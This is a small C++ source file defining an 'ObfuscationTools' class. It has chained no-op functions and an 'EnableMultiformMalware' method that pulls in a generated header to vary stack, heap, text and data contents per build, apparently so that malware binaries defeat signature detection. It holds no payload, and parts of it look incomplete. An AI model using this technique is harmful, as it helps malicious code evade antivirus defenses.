class ObfuscationTools{
	private:
		int* rzHeap=NULL;
		void Do4(){
			return;
		}
		void Do3(){
			Do4();
			return;
		}
		void Do2(){
			Do3();
			return;
		}
		void Do1(){
			Do2();
			Do3();
			Do4();
		}

		void AntiWarnCall(int a, int b, int c, int d, int e){
			return ;
		}
	public:
		int ObfuscateExecution(){
			Do1();
			return 0;
		}

		void EnableMultiformMalware(){
			if (rzHeap != NULL)
				free(rzHeap);

			#include <dyn_s2hashes.hxx>

				int rzStack=RZ_STACK;
				rzHeap=(int*)malloc(sizeof(unsigned int));
						*rzHeap=RZ_HEAP;
				RZ_TEXT_1;
				RZ_TEXT_2;
				RZ_TEXT_3;

				const int rzRodata=RZ_RO_DATA;
				int rzRwdata=RZ_RW_DATA;

				AntiWarnCall(rzStack, *rzHeap, rzRodata, rzRwdata, Rz3);

				return;
		}
};
